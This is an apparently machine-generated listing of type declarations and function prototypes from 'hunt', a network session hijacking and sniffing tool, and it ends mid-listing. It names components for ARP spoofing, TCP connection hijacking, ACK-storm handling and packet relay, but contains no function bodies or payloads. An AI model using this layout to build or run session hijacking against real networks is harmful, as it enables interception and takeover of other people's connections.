// #anon_enum_RESET=0_RAW=1_CBREAK=2
// file tty.c line 16
enum anonymous_10 { RESET=0, RAW=1, CBREAK=2 };

// tag-#anon#ST[*{V}_V_'_call_addr'||S32'_syscall'||U32'_arch'|]
// file /usr/include/x86_64-linux-gnu/bits/siginfo.h line 121
struct anonymous_25;

// tag-#anon#ST[*{V}_V_'si_addr'||S16'si_addr_lsb'||U48'_pad0'|]
// file /usr/include/x86_64-linux-gnu/bits/siginfo.h line 107
struct anonymous_23;

// tag-#anon#ST[ARR16{S64}_S64_'__fds_bits'|]
// file /usr/include/x86_64-linux-gnu/sys/select.h line 64
struct anonymous_29;

// tag-#anon#ST[ARR16{U64}_U64_'__val'|]
// file /usr/include/x86_64-linux-gnu/bits/sigset.h line 27
struct anonymous_3;

// tag-#anon#ST[S32'__lock'||U32'__futex'||U64'__total_seq'||U64'__wakeup_seq'||U64'__woken_seq'||*{V}_V_'__mutex'||U32'__nwaiters'||U32'__broadcast_seq'|]
// file /usr/include/x86_64-linux-gnu/bits/pthreadtypes.h line 141
struct anonymous_5;

// tag-#anon#ST[S32'si_pid'||U32'si_uid'|]
// file /usr/include/x86_64-linux-gnu/bits/siginfo.h line 74
struct anonymous_19;

// tag-#anon#ST[S32'si_pid'||U32'si_uid'||S32'si_status'||U32'_pad0'||S64'si_utime'||S64'si_stime'|]
// file /usr/include/x86_64-linux-gnu/bits/siginfo.h line 97
struct anonymous_22;

// tag-#anon#ST[S32'si_pid'||U32'si_uid'||SYM#tag-sigval#'si_sigval'|]
// file /usr/include/x86_64-linux-gnu/bits/siginfo.h line 89
struct anonymous_21;

// tag-#anon#ST[S32'si_signo'||S32'si_errno'||S32'si_code'||U32'_pad0'||SYM#tag-#anon#UN[ARR28{S32}_S32_'_pad'||SYM#tag-#anon#ST[S32'si_pid'||U32'si_uid'|]#'_kill'||SYM#tag-#anon#ST[S32'si_tid'||S32'si_overrun'||SYM#tag-sigval#'si_sigval'|]#'_timer'||SYM#tag-#anon#ST[S32'si_pid'||U32'si_uid'||SYM#tag-sigval#'si_sigval'|]#'_rt'||SYM#tag-#anon#ST[S32'si_pid'||U32'si_uid'||S32'si_status'||U32'_pad0'||S64'si_utime'||S64'si_stime'|]#'_sigchld'||SYM#tag-#anon#ST[*{V}_V_'si_addr'||S16'si_addr_lsb'||U48'_pad0'|]#'_sigfault'||SYM#tag-#anon#ST[S64'si_band'||S32'si_fd'||U32'_pad0'|]#'_sigpoll'||SYM#tag-#anon#ST[*{V}_V_'_call_addr'||S32'_syscall'||U32'_arch'|]#'_sigsys'|]#'_sifields'|]
// file /usr/include/x86_64-linux-gnu/bits/siginfo.h line 62
struct anonymous_27;

// tag-#anon#ST[S32'si_tid'||S32'si_overrun'||SYM#tag-sigval#'si_sigval'|]
// file /usr/include/x86_64-linux-gnu/bits/siginfo.h line 81
struct anonymous_20;

// tag-#anon#ST[S64'si_band'||S32'si_fd'||U32'_pad0'|]
// file /usr/include/x86_64-linux-gnu/bits/siginfo.h line 114
struct anonymous_24;

// tag-#anon#ST[U16'__glibc_reserved'||U16'mtu'|]
// file /usr/include/netinet/ip_icmp.h line 39
struct anonymous_12;

// tag-#anon#ST[U16'id'||U16'seq'|]
// file hunt.h line 685
struct anonymous;

// tag-#anon#ST[U16'id'||U16'sequence'|]
// file /usr/include/netinet/ip_icmp.h line 33
struct anonymous_11;

// tag-#anon#ST[U16'source'||U16'dest'||U16'len'||U16'check'|]
// file /usr/include/netinet/udp.h line 67
struct anonymous_15;

// tag-#anon#ST[U16'source'||U16'dest'||U32'seq'||U32'ack_seq'||BF{U16}_U16_'res1'||BF{U16}_U16_'doff'||BF{U16}_U16_'fin'||BF{U16}_U16_'syn'||BF{U16}_U16_'rst'||BF{U16}_U16_'psh'||BF{U16}_U16_'ack'||BF{U16}_U16_'urg'||BF{U16}_U16_'res2'||U16'window'||U16'check'||U16'urg_ptr'|]
// file /usr/include/netinet/tcp.h line 103
struct anonymous_8;

// tag-#anon#ST[U16'th_sport'||U16'th_dport'||U32'th_seq'||U32'th_ack'||BF{U8}_U8_'th_x2'||BF{U8}_U8_'th_off'||U8'th_flags'||U16'th_win'||U16'th_sum'||U16'th_urp'|]
// file /usr/include/netinet/tcp.h line 78
struct anonymous_7;

// tag-#anon#ST[U16'uh_sport'||U16'uh_dport'||U16'uh_ulen'||U16'uh_sum'|]
// file /usr/include/netinet/udp.h line 60
struct anonymous_14;

// tag-#anon#UN[*{SYM#tag-tcphdr#}_SYM#tag-tcphdr#_'p_tcph'||*{SYM#tag-udphdr#}_SYM#tag-udphdr#_'p_udph'||*{SYM#tag-icmphdr#}_SYM#tag-icmphdr#_'p_icmph'|]
// file hunt.h line 103
union anonymous_1;

// tag-#anon#UN[*{V(S32)->V}_V(S32)->V_'sa_handler'||*{V(S32|*{SYM#tag-#anon#ST[S32'si_signo'||S32'si_errno'||S32'si_code'||U32'_pad0'||SYM#tag-#anon#UN[ARR28{S32}_S32_'_pad'||SYM#tag-#anon#ST[S32'si_pid'||U32'si_uid'|]#'_kill'||SYM#tag-#anon#ST[S32'si_tid'||S32'si_overrun'||SYM#tag-sigval#'si_sigval'|]#'_timer'||SYM#tag-#anon#ST[S32'si_pid'||U32'si_uid'||SYM#tag-sigval#'si_sigval'|]#'_rt'||SYM#tag-#anon#ST[S32'si_pid'||U32'si_uid'||S32'si_status'||U32'_pad0'||S64'si_utime'||S64'si_stime'|]#'_sigchld'||SYM#tag-#anon#ST[*{V}_V_'si_addr'||S16'si_addr_lsb'||U48'_pad0'|]#'_sigfault'||SYM#tag-#anon#ST[S64'si_band'||S32'si_fd'||U32'_pad0'|]#'_sigpoll'||SYM#tag-#anon#ST[*{V}_V_'_call_addr'||S32'_syscall'||U32'_arch'|]#'_sigsys'|]#'_sifields'|]#}_SYM#tag-#anon#ST[S32'si_signo'||S32'si_errno'||S32'si_code'||U32'_pad0'||SYM#tag-#anon#UN[ARR28{S32}_S32_'_pad'||SYM#tag-#anon#ST[S32'si_pid'||U32'si_uid'|]#'_kill'||SYM#tag-#anon#ST[S32'si_tid'||S32'si_overrun'||SYM#tag-sigval#'si_sigval'|]#'_timer'||SYM#tag-#anon#ST[S32'si_pid'||U32'si_uid'||SYM#tag-sigval#'si_sigval'|]#'_rt'||SYM#tag-#anon#ST[S32'si_pid'||U32'si_uid'||S32'si_status'||U32'_pad0'||S64'si_utime'||S64'si_stime'|]#'_sigchld'||SYM#tag-#anon#ST[*{V}_V_'si_addr'||S16'si_addr_lsb'||U48'_pad0'|]#'_sigfault'||SYM#tag-#anon#ST[S64'si_band'||S32'si_fd'||U32'_pad0'|]#'_sigpoll'||SYM#tag-#anon#ST[*{V}_V_'_call_addr'||S32'_syscall'||U32'_arch'|]#'_sigsys'|]#'_sifields'|]#_|*{V}_V_)->V}_V(S32|*{SYM#tag-#anon#ST[S32'si_signo'||S32'si_errno'||S32'si_code'||U32'_pad0'||SYM#tag-#anon#UN[ARR28{S32}_S32_'_pad'||SYM#tag-#anon#ST[S32'si_pid'||U32'si_uid'|]#'_kill'||SYM#tag-#anon#ST[S32'si_tid'||S32'si_overrun'||SYM#tag-sigval#'si_sigval'|]#'_timer'||SYM#tag-#anon#ST[S32'si_pid'||U32'si_uid'||SYM#tag-sigval#'si_sigval'|]#'_rt'||SYM#tag-#anon#ST[S32'si_pid'||U32'si_uid'||S32'si_status'||U32'_pad0'||S64'si_utime'||S64'si_stime'|]#'_sigchld'||SYM#tag-#anon#ST[*{V}_V_'si_addr'||S16'si_addr_lsb'||U48'_pad0'|]#'_sigfault'||SYM#tag-#anon#ST[S64'si_band'||S32'si_fd'||U32'_pad0'|]#'_sigpoll'||SYM#tag-#anon#ST[*{V}_V_'_call_addr'||S32'_syscall'||U32'_arch'|]#'_sigsys'|]#'_sifields'|]#}_SYM#tag-#anon#ST[S32'si_signo'||S32'si_errno'||S32'si_code'||U32'_pad0'||SYM#tag-#anon#UN[ARR28{S32}_S32_'_pad'||SYM#tag-#anon#ST[S32'si_pid'||U32'si_uid'|]#'_kill'||SYM#tag-#anon#ST[S32'si_tid'||S32'si_overrun'||SYM#tag-sigval#'si_sigval'|]#'_timer'||SYM#tag-#anon#ST[S32'si_pid'||U32'si_uid'||SYM#tag-sigval#'si_sigval'|]#'_rt'||SYM#tag-#anon#ST[S32'si_pid'||U32'si_uid'||S32'si_status'||U32'_pad0'||S64'si_utime'||S64'si_stime'|]#'_sigchld'||SYM#tag-#anon#ST[*{V}_V_'si_addr'||S16'si_addr_lsb'||U48'_pad0'|]#'_sigfault'||SYM#tag-#anon#ST[S64'si_band'||S32'si_fd'||U32'_pad0'|]#'_sigpoll'||SYM#tag-#anon#ST[*{V}_V_'_call_addr'||S32'_syscall'||U32'_arch'|]#'_sigsys'|]#'_sifields'|]#_|*{V}_V_)->V_'sa_sigaction'|]
// file /usr/include/x86_64-linux-gnu/bits/sigaction.h line 28
union anonymous_28;

// tag-#anon#UN[ARR16{S8}_S8_'ifrn_name'|]
// file /usr/include/net/if.h line 130
union anonymous_17;

// tag-#anon#UN[ARR28{S32}_S32_'_pad'||SYM#tag-#anon#ST[S32'si_pid'||U32'si_uid'|]#'_kill'||SYM#tag-#anon#ST[S32'si_tid'||S32'si_overrun'||SYM#tag-sigval#'si_sigval'|]#'_timer'||SYM#tag-#anon#ST[S32'si_pid'||U32'si_uid'||SYM#tag-sigval#'si_sigval'|]#'_rt'||SYM#tag-#anon#ST[S32'si_pid'||U32'si_uid'||S32'si_status'||U32'_pad0'||S64'si_utime'||S64'si_stime'|]#'_sigchld'||SYM#tag-#anon#ST[*{V}_V_'si_addr'||S16'si_addr_lsb'||U48'_pad0'|]#'_sigfault'||SYM#tag-#anon#ST[S64'si_band'||S32'si_fd'||U32'_pad0'|]#'_sigpoll'||SYM#tag-#anon#ST[*{V}_V_'_call_addr'||S32'_syscall'||U32'_arch'|]#'_sigsys'|]
// file /usr/include/x86_64-linux-gnu/bits/siginfo.h line 69
union anonymous_26;

// tag-#anon#UN[ARR4{S8}_S8_'__size'||S32'__align'|]
// file /usr/include/x86_64-linux-gnu/bits/pthreadtypes.h line 130
union anonymous_9;

// tag-#anon#UN[SYM#tag-#anon#ST[S32'__lock'||U32'__futex'||U64'__total_seq'||U64'__wakeup_seq'||U64'__woken_seq'||*{V}_V_'__mutex'||U32'__nwaiters'||U32'__broadcast_seq'|]#'__data'||ARR48{S8}_S8_'__size'||S64'__align'|]
// file /usr/include/x86_64-linux-gnu/bits/pthreadtypes.h line 139
union anonymous_4;

// tag-#anon#UN[SYM#tag-#anon#ST[U16'id'||U16'seq'|]#'idseq'||U32'res'|]
// file hunt.h line 684
union anonymous_0;

// tag-#anon#UN[SYM#tag-#anon#ST[U16'id'||U16'sequence'|]#'echo'||U32'gateway'||SYM#tag-#anon#ST[U16'__glibc_reserved'||U16'mtu'|]#'frag'|]
// file /usr/include/netinet/ip_icmp.h line 31
union anonymous_13;

// tag-#anon#UN[SYM#tag-#anon#ST[U16'th_sport'||U16'th_dport'||U32'th_seq'||U32'th_ack'||BF{U8}_U8_'th_x2'||BF{U8}_U8_'th_off'||U8'th_flags'||U16'th_win'||U16'th_sum'||U16'th_urp'|]#'_anon0'||SYM#tag-#anon#ST[U16'source'||U16'dest'||U32'seq'||U32'ack_seq'||BF{U16}_U16_'res1'||BF{U16}_U16_'doff'||BF{U16}_U16_'fin'||BF{U16}_U16_'syn'||BF{U16}_U16_'rst'||BF{U16}_U16_'psh'||BF{U16}_U16_'ack'||BF{U16}_U16_'urg'||BF{U16}_U16_'res2'||U16'window'||U16'check'||U16'urg_ptr'|]#'_anon1'|]
// file /usr/include/netinet/tcp.h line 76
union anonymous_6;

// tag-#anon#UN[SYM#tag-#anon#ST[U16'uh_sport'||U16'uh_dport'||U16'uh_ulen'||U16'uh_sum'|]#'_anon0'||SYM#tag-#anon#ST[U16'source'||U16'dest'||U16'len'||U16'check'|]#'_anon1'|]
// file /usr/include/netinet/udp.h line 58
union anonymous_16;

// tag-#anon#UN[SYM#tag-__pthread_mutex_s#'__data'||ARR40{S8}_S8_'__size'||S64'__align'|]
// file /usr/include/x86_64-linux-gnu/bits/pthreadtypes.h line 90
union anonymous_2;

// tag-#anon#UN[SYM#tag-sockaddr#'ifru_addr'||SYM#tag-sockaddr#'ifru_dstaddr'||SYM#tag-sockaddr#'ifru_broadaddr'||SYM#tag-sockaddr#'ifru_netmask'||SYM#tag-sockaddr#'ifru_hwaddr'||S16'ifru_flags'||S32'ifru_ivalue'||S32'ifru_mtu'||SYM#tag-ifmap#'ifru_map'||ARR16{S8}_S8_'ifru_slave'||ARR16{S8}_S8_'ifru_newname'||*{S8}_S8_'ifru_data'|]
// file /usr/include/net/if.h line 135
union anonymous_18;

// tag-PACKET_TYPE
// file hunt.h line 66
enum PACKET_TYPE { PACKET_NONE=0, PACKET_TCP=1, PACKET_UDP=2, PACKET_ICMP=3, PACKET_ARP=4 };

// tag-TTY_COLOR
// file hunt.h line 388
enum TTY_COLOR { COLOR_BLACK=0, COLOR_RED=1, COLOR_GREEN=2, COLOR_BROWN=3, COLOR_BLUE=4, COLOR_MAGENTA=5, COLOR_CYAN=6, COLOR_LIGHTGRAY=7, COLOR_GRAY=8, COLOR_BRIGHTRED=9, COLOR_BRIGHTGREEN=10, COLOR_YELLOW=11, COLOR_BRIGHTBLUE=12, COLOR_BRIGHTMAGENTA=13, COLOR_BRIGHTCYAN=14, COLOR_WHITE=15 };

// tag-_IO_FILE
// file /usr/include/stdio.h line 44
struct _IO_FILE;

// tag-_IO_marker
// file /usr/include/libio.h line 160
struct _IO_marker;

// tag-__jmp_buf_tag
// file /usr/include/pthread.h line 744
struct __jmp_buf_tag;

// tag-__pthread_internal_list
// file /usr/include/x86_64-linux-gnu/bits/pthreadtypes.h line 75
struct __pthread_internal_list;

// tag-__pthread_mutex_s
// file /usr/include/x86_64-linux-gnu/bits/pthreadtypes.h line 92
struct __pthread_mutex_s;

// tag-add_policy_info
// file hunt.h line 248
struct add_policy_info;

// tag-arp_dont_relay
// file hunt.h line 535
struct arp_dont_relay;

// tag-arp_spec
// file hunt.h line 703
struct arp_spec;

// tag-arp_spoof_info
// file hunt.h line 196
struct arp_spoof_info;

// tag-arp_spoof_range
// file arpspoof.c line 19
struct arp_spoof_range;

// tag-arpeth_hdr
// file hunt.h line 236
struct arpeth_hdr;

// tag-arphdr
// file /usr/include/net/if_arp.h line 54
struct arphdr;

// tag-array
// file c/array.h line 20
struct array;

// tag-array_item
// file c/array.h line 16
struct array_item;

// tag-array_iterator
// file c/array.h line 47
struct array_iterator;

// tag-conn_info
// file hunt.h line 161
struct conn_info;

// tag-ethhdr
// file /usr/include/linux/if_ether.h line 138
struct ethhdr;

// tag-hash
// file c/hash.h line 31
struct hash;

// tag-hash_iterator
// file c/hash.h line 44
struct hash_iterator;

// tag-hash_table_item
// file c/hash.h line 26
struct hash_table_item;

// tag-host_info
// file hunt.h line 151
struct host_info;

// tag-host_up_info
// file hostup.c line 24
struct host_up_info;

// tag-hostent
// file /usr/include/netdb.h line 100
struct hostent;

// tag-icmp_spec
// file hunt.h line 676
struct icmp_spec;

// tag-icmphdr
// file /usr/include/netinet/ip_icmp.h line 26
struct icmphdr;

// tag-ifmap
// file /usr/include/net/if.h line 111
struct ifmap;

// tag-ifreq
// file /usr/include/net/if.h line 126
struct ifreq;

// tag-ifunc_item
// file hunt.h line 131
struct ifunc_item;

// tag-ifunc_list
// file hunt.h line 134
struct ifunc_list;

// tag-in_addr
// file /usr/include/netinet/in.h line 31
struct in_addr;

// tag-iovec
// file /usr/include/x86_64-linux-gnu/bits/uio.h line 43
struct iovec;

// tag-iphdr
// file /usr/include/netinet/ip.h line 44
struct iphdr;

// tag-list
// file c/list.h line 20
struct list;

// tag-list_iterator
// file c/list.h line 18
struct list_iterator;

// tag-mac_disc_info
// file macdisc.c line 65
struct mac_disc_info;

// tag-mac_info
// file hunt.h line 243
struct mac_info;

// tag-msghdr
// file /usr/include/x86_64-linux-gnu/bits/socket.h line 224
struct msghdr;

// tag-packet
// file hunt.h line 91
struct packet;

// tag-packet_info
// file hunt.h line 183
struct packet_info;

// tag-pthread_attr_t
// file /usr/include/x86_64-linux-gnu/bits/pthreadtypes.h line 63
union pthread_attr_t;

// tag-relay_item
// file pktrelay.c line 35
struct relay_item;

// tag-req
// file resolv.c line 22
struct req;

// tag-res
// file resolv.c line 27
struct res;

// tag-resolv_item
// file hunt.h line 444
struct resolv_item;

// tag-rst_db_item
// file rstd.c line 19
struct rst_db_item;

// tag-servent
// file /usr/include/netdb.h line 257
struct servent;

// tag-sigaction
// file /usr/include/x86_64-linux-gnu/bits/sigaction.h line 24
struct sigaction;

// tag-sigval
// file /usr/include/x86_64-linux-gnu/bits/siginfo.h line 32
union sigval;

// tag-slave
// file resolv.c line 34
struct slave;

// tag-sniff_info
// file sniff.c line 40
struct sniff_info;

// tag-sniff_log
// file sniff.c line 23
struct sniff_log;

// tag-sockaddr
// file /usr/include/x86_64-linux-gnu/bits/socket.h line 149
struct sockaddr;

// tag-stat
// file /usr/include/x86_64-linux-gnu/bits/stat.h line 46
struct stat;

// tag-tcp_spec
// file hunt.h line 655
struct tcp_spec;

// tag-tcphdr
// file /usr/include/netinet/tcp.h line 74
struct tcphdr;

// tag-termios
// file /usr/include/x86_64-linux-gnu/bits/termios.h line 28
struct termios;

// tag-time_job
// file hunt.h line 639
struct time_job;

// tag-timejob
// file hunt.h line 194
struct timejob;

// tag-timespec
// file /usr/include/time.h line 120
struct timespec;

// tag-timeval
// file /usr/include/x86_64-linux-gnu/bits/time.h line 30
struct timeval;

// tag-timezone
// file /usr/include/x86_64-linux-gnu/sys/time.h line 55
struct timezone;

// tag-u_longchar
// file hunt.h line 85
union u_longchar;

// tag-udphdr
// file /usr/include/netinet/udp.h line 56
struct udphdr;

// tag-user_conn_info
// file hunt.h line 176
struct user_conn_info;

// tag-watch_tty_data
// file arphijack.c line 46
struct watch_tty_data;

#include <assert.h>

#ifndef NULL
#define NULL ((void*)0)
#endif

// Sendmsg
// file net.c line 17
signed int Sendmsg(signed int s, struct msghdr *msg, unsigned int flags);
// _IO_getc
// file /usr/include/libio.h line 434
extern signed int _IO_getc(struct _IO_FILE *);
// _IO_putc
// file /usr/include/libio.h line 435
extern signed int _IO_putc(signed int, struct _IO_FILE *);
// __assert_fail
// file /usr/include/assert.h line 69
extern void __assert_fail(const char *, const char *, unsigned int, const char *);
// __bswap_32
// file /usr/include/x86_64-linux-gnu/bits/byteswap.h line 45
static inline unsigned int __bswap_32(unsigned int __bsx);
// __bswap_32_link1
// file /usr/include/x86_64-linux-gnu/bits/byteswap.h line 45
static inline unsigned int __bswap_32_link1(unsigned int __bsx_link1);
// __bswap_32_link2
// file /usr/include/x86_64-linux-gnu/bits/byteswap.h line 45
static inline unsigned int __bswap_32_link2(unsigned int __bsx_link2);
// __bswap_32_link3
// file /usr/include/x86_64-linux-gnu/bits/byteswap.h line 45
static inline unsigned int __bswap_32_link3(unsigned int __bsx_link3);
// __bswap_32_link4
// file /usr/include/x86_64-linux-gnu/bits/byteswap.h line 45
static inline unsigned int __bswap_32_link4(unsigned int __bsx_link4);
// __bswap_32_link5
// file /usr/include/x86_64-linux-gnu/bits/byteswap.h line 45
static inline unsigned int __bswap_32_link5(unsigned int __bsx_link5);
// __bswap_32_link6
// file /usr/include/x86_64-linux-gnu/bits/byteswap.h line 45
static inline unsigned int __bswap_32_link6(unsigned int __bsx_link6);
// __bswap_32_link7
// file /usr/include/x86_64-linux-gnu/bits/byteswap.h line 45
static inline unsigned int __bswap_32_link7(unsigned int __bsx_link7);
// __chose_table_size
// file c/hash.c line 16
static signed int __chose_table_size(signed int size);
// __conn_add
// file hunt.c line 305
static void __conn_add(struct packet *p, unsigned int key);
// __ctype_b_loc
// file /usr/include/ctype.h line 79
extern const unsigned short int ** __ctype_b_loc(void);
// __enqueue
// file c/list.c line 78
static inline void __enqueue(struct list *l, void *m);
// __errno_location
// file /usr/include/x86_64-linux-gnu/bits/errno.h line 50
extern signed int * __errno_location(void);
// __func_remove
// file c/list.c line 242
static inline signed int __func_remove(signed int nr, void *p, void *m);
// __func_remove_at
// file c/list.c line 250
static inline signed int __func_remove_at(signed int nr, void *p, void *m);
// __hash_find
// file c/hash.c line 131
static signed int __hash_find(struct hash *h, unsigned int key, void *arg);
// __hash_need_space
// file c/hash.c line 40
static inline signed int __hash_need_space(struct hash *h);
// __hash_new_space
// file c/hash.c line 222
static void __hash_new_space(struct hash *h);
// __hash_put
// file c/hash.c line 159
static void __hash_put(struct hash *h, unsigned int key, void *data);
// __hash_put_check
// file c/hash.c line 175
static signed int __hash_put_check(struct hash *h, unsigned int key, void *data, void *arg);
// __hash_remap
// file c/hash.c line 192
static void __hash_remap(struct hash *h, signed int hv);
// __hv
// file c/hash.c line 80
static inline signed int __hv(unsigned int key, unsigned int max_items);
// __hv_load_position
// file c/hash.c line 122
static inline signed int __hv_load_position(void);
// __hv_next
// file c/hash.c line 94
static inline signed int __hv_next(void);
// __hv_peek
// file c/hash.c line 89
static inline signed int __hv_peek(void);
// __hv_peek_next
// file c/hash.c line 105
static inline signed int __hv_peek_next(void);
// __hv_save_position
// file c/hash.c line 114
static inline void __hv_save_position(void);
// __list_consume
// file c/list.c line 162
static void * __list_consume(struct list *l, struct timespec *absts);
// __list_remove
// file c/list.c line 258
static inline void * __list_remove(struct list *l, signed int (*func)(signed int, void *, void *), void *m);
// __list_remove::func_object
//
signed int func_object(signed int, void *, void *);
// __lock
// file c/list.c line 30
static inline void __lock(struct list *l);
// __lock_link1
// file c/hash.c line 251
static inline void __lock_link1(struct hash *h);
// __lock_link2
// file c/array.c line 37
static inline void __lock_link2(struct array *a);
// __pop
// file c/list.c line 140
static inline void * __pop(struct list *l);
// __rawmemchr
// file /usr/include/x86_64-linux-gnu/bits/string2.h line 393
extern void * __rawmemchr(const void *, signed int);
// __register
// file timer.c line 25
static signed int __register(struct timejob *tj);
// __sigsetjmp
// file /usr/include/pthread.h line 745
extern signed int __sigsetjmp(struct __jmp_buf_tag *, signed int);
// __strdup
// file /usr/include/x86_64-linux-gnu/bits/string2.h line 1278
extern char * __strdup(const char *);
// __unlock
// file c/list.c line 38
static inline void __unlock(struct list *l);
// __unlock_link1
// file c/hash.c line 259
static inline void __unlock_link1(struct hash *h);
// __unlock_link2
// file c/array.c line 45
static inline void __unlock_link2(struct array *a);
// __update_iterators
// file c/list.c line 58
static inline void __update_iterators(struct list *l, void *old_item, void *new_item);
// __when_need_space
// file c/hash.c line 35
static inline signed int __when_need_space(signed int max_items);
// __xstat
// file /usr/include/x86_64-linux-gnu/sys/stat.h line 400
extern signed int __xstat(signed int, const char *, struct stat *);
// a_hijack
// file main.c line 278
void a_hijack(void);
// ack_storm_notify
// file hunt.c line 355
static void ack_storm_notify(struct conn_info *ci, struct user_conn_info *uci);
// add_telnet_rlogin_policy
// file hunt.h line 596
void add_telnet_rlogin_policy(void);
// addpolicy_add_item
// file addpolicy.c line 103
void addpolicy_add_item(void);
// addpolicy_del_item
// file addpolicy.c line 169
void addpolicy_del_item(void);
// addpolicy_item_print
// file addpolicy.c line 72
static void addpolicy_item_print(signed int i, struct add_policy_info *api);
// addpolicy_list_items
// file addpolicy.c line 87
void addpolicy_list_items(void);
// addpolicy_mod_item
// file addpolicy.c line 136
void addpolicy_mod_item(void);
// arp_dont_relay_insert
// file hunt.h line 543
struct arp_dont_relay * arp_dont_relay_insert(unsigned int src_addr, unsigned int dst_addr, unsigned int src_port, unsigned int dst_port);
// arp_dont_relay_remove
// file hunt.h line 546
void arp_dont_relay_remove(struct arp_dont_relay *adr);
// arp_hijack
// file arphijack.c line 103
signed int arp_hijack(struct conn_info *ci, char *src_fake_mac, char *dst_fake_mac, signed int input_mode);
// arp_hijack_done
// file arphijack.c line 261
void arp_hijack_done(char *src_fake_mac, char *dst_fake_mac);
// arp_relay
// file arpspoof.c line 728
static void * arp_relay(void *arg);
// arp_request_spoof_through_request_setup
// file options.c line 117
static void arp_request_spoof_through_request_setup(void);
// arp_rr_count_setup
// file options.c line 108
static void arp_rr_count_setup(void);
// arp_spoof_add_h
// file arpspoof.c line 1109
static void arp_spoof_add_h(void);
// arp_spoof_add_item
// file arpspoof.c line 964
static void arp_spoof_add_item(void);
// arp_spoof_count
// file arpspoof.c line 1062
static signed int arp_spoof_count(void);
// arp_spoof_del_h
// file arpspoof.c line 1175
static void arp_spoof_del_h(void);
// arp_spoof_del_item
// file arpspoof.c line 1079
static void arp_spoof_del_item(void);
// arp_spoof_list_items
// file arpspoof.c line 919
static signed int arp_spoof_list_items(void);
// arp_spoof_range_add
// file arpspoof.c line 1019
static void arp_spoof_range_add(void);
// arp_spoof_range_del
// file arpspoof.c line 1093
static void arp_spoof_range_del(void);
// arp_spoof_range_list
// file arpspoof.c line 942
static signed int arp_spoof_range_list(void);
// arp_spoof_range_user_test
// file arpspoof.c line 1244
static void arp_spoof_range_user_test(void);
// arp_spoof_switch_setup
// file options.c line 132
static void arp_spoof_switch_setup(void);
// arp_spoof_timejob
// file arpspoof.c line 129
signed int arp_spoof_timejob(void *arg, signed int arg_sec);
// arp_spoof_user_test
// file arpspoof.c line 1231
static void arp_spoof_user_test(void);
// arp_spoof_with_my_mac_setup
// file options.c line 147
static void arp_spoof_with_my_mac_setup(void);
// arpspoof_exit_check
// file hunt.h line 533
signed int arpspoof_exit_check();
// arpspoof_menu
// file hunt.h line 526
void arpspoof_menu(void);
// arpspoof_test
// file arpspoof.c line 1372
signed int arpspoof_test(struct arp_spoof_info *asi);
// array_at
// file c/array.c line 64
void * array_at(struct array *a, signed int nr);
// array_count
// file c/array.c line 172
signed int array_count(struct array *a);
// array_free
// file c/array.c line 53
void array_free(struct array *a);
// array_init
// file c/array.c line 25
void array_init(struct array *a, signed int size);
// array_iter_end
// file c/array.c line 236
void array_iter_end(struct array_iterator *ai);
// array_iter_get
// file c/array.c line 218
void * array_iter_get(struct array_iterator *ai);
// array_iter_lock
// file c/array.c line 202
void array_iter_lock(struct array_iterator *ai);
// array_iter_set
// file c/array.c line 212
void array_iter_set(struct array_iterator *ai, struct array *a);
// array_iter_unlock
// file c/array.c line 207
void array_iter_unlock(struct array_iterator *ai);
// array_lock
// file c/array.c line 182
void array_lock(struct array *a);
// array_pop
// file c/array.c line 154
void * array_pop(struct array *a);
// array_put
// file c/array.c line 135
signed int array_put(struct array *a, void *m);
// array_put_at
// file c/array.c line 82
void * array_put_at(struct array *a, signed int nr, void *m);
// array_remove
// file c/array.c line 98
void * array_remove(struct array *a, void *m);
// array_remove_at
// file c/array.c line 77
void * array_remove_at(struct array *a, signed int nr);
// array_unlock
// file c/array.c line 194
void array_unlock(struct array *a);
// asi_release
// file arpspoof.c line 380
static void asi_release(struct arp_spoof_info *asi);
// asi_wait_for_release
// file arpspoof.c line 388
static void asi_wait_for_release(struct arp_spoof_info *asi);
// asi_want
// file arpspoof.c line 373
static void asi_want(struct arp_spoof_info *asi);
// atexit
// file /usr/include/stdlib.h line 519
extern signed int atexit(void (*)(void));
// calloc
// file /usr/include/stdlib.h line 468
extern void * calloc(unsigned long int, unsigned long int);
// check_dont_relay
// file arpspoof.c line 633
static signed int check_dont_relay(struct packet *p);
// check_interval
// file resolv.c line 109
static void check_interval(signed int __time);
// choose_connection
// file main.c line 54
signed int choose_connection(struct user_conn_info *uci);
// choose_daemon
// file main.c line 378
static void choose_daemon(void);
// cleanup_slaves
// file resolv.c line 312
static void cleanup_slaves(struct list *slaves);
// clear_new_conn_ind
// file hunt.h line 374
void clear_new_conn_ind(void);
// clear_scr
// file hunt.h line 433
void clear_scr(void);
// close
// file /usr/include/unistd.h line 353
extern signed int close(signed int);
// conn_add
// file hunt.c line 514
static void conn_add(struct packet *p);
// conn_add_match
// file hunt.h line 593
signed int conn_add_match(unsigned int src_addr, unsigned int dst_addr, unsigned short int src_port, unsigned short int dst_port);
// conn_add_policy
// file hunt.h line 595
signed int conn_add_policy(struct iphdr *iph, struct tcphdr *tcph);
// conn_add_update
// file hunt.c line 377
static void conn_add_update(struct packet *p);
// conn_del
// file hunt.c line 471
static void conn_del(struct packet *p);
// conn_exist
// file hunt.c line 258
signed int conn_exist(struct user_conn_info *uci);
// conn_free
// file hunt.c line 228
void conn_free(struct conn_info *ci);
// conn_get
// file hunt.c line 242
struct conn_info * conn_get(struct user_conn_info *uci);
// conn_list
// file hunt.c line 919
signed int conn_list(struct user_conn_info **ruci, char **rbuf, signed int with_mac, signed int with_seq);
// conn_skip_update
// file hunt.c line 288
static signed int conn_skip_update(struct conn_info *ci, struct packet *p);
// conn_update_table
// file hunt.c line 538
static void conn_update_table(struct packet *p, struct ethhdr *ethh, struct iphdr *iph);
// count_mask
// file util.c line 90
signed int count_mask(unsigned int mask);
// ctrl_c_handler
// file main.c line 101
static void ctrl_c_handler(signed int i);
// ctrl_c_handler_link1
// file menu.c line 111
static void ctrl_c_handler_link1(signed int nr);
// ctrl_c_prompt
// file hunt.h line 432
void ctrl_c_prompt(void);
// ctrl_c_sync_handler
// file synchijack.c line 455
void ctrl_c_sync_handler(signed int signr);
// db_item_print
// file rstd.c line 219
static void db_item_print(signed int i, struct rst_db_item *dbi);
// do_test_or_refresh
// file arpspoof.c line 1205
static void do_test_or_refresh(struct arp_spoof_info *asi);
// dump_connection
// file main.c line 181
void dump_connection(struct user_conn_info *uci);
// dump_connection_uci
// file main.c line 111
void dump_connection_uci(struct user_conn_info *uci, signed int mode, signed int same_chars);
// ethtap_relay
// file pktrelay.c line 142
void ethtap_relay(struct packet *p, struct relay_item *ri);
// exit
// file timer.c line 154 function timer_init
void exit(signed int);
// f_hijack_sync
// file synchijack.c line 334
